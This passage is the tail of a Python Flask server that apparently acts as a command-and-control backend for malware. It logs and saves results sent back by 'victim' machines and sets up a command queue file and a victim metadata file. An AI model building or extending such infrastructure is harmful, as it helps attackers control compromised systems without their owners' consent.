            logging.info(f"API: Saved non-matching result from {victim_hash} to {os.path.join(unknown_result_dir, unknown_result_filename)}")
        except Exception as e_unknown_save:
            logging.error(f"API: Failed to save non-matching result from {victim_hash}: {e_unknown_save}")


    return jsonify({"status": "success"})

if __name__ == '__main__':
    # 애플리케이션 시작 시 파일들 초기화
    if not os.path.exists(COMMAND_QUEUE_FILE):
        logging.info(f"Command queue file {COMMAND_QUEUE_FILE} not found, creating empty queue.")
        save_command_queue([])
    if not os.path.exists(VICTIM_METADATA_FILE):
        logging.info(f"Victim metadata file {VICTIM_METADATA_FILE} not found, creating empty metadata.")
        save_victim_metadata({})
        
    app.run(host='0.0.0.0', port=API_PORT, debug=True)
